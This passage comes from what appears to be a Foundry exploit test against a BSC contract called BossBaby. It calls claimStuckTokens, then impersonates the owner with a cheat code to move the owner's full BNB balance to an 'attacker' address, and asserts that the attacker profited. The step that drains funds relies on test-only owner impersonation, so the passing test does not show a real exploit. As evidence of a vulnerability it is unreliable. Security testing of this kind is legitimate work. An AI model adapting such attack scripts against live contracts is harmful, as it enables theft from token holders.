        BossBaby(TARGET).claimStuckTokens(address(0x0));  // address(0) for native token
        vm.stopPrank();

        // Step 5: Transfer claimed BNB from owner to attacker
        // We need to impersonate owner again to send us the BNB
        vm.startPrank(owner);
        payable(attacker).transfer(address(owner).balance);
        vm.stopPrank();

        // Step 6: Verify attacker's BNB increased
        uint256 finalBalance = address(attacker).balance;
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        assertGt(finalBalance, initialBalance, "Attacker BNB balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
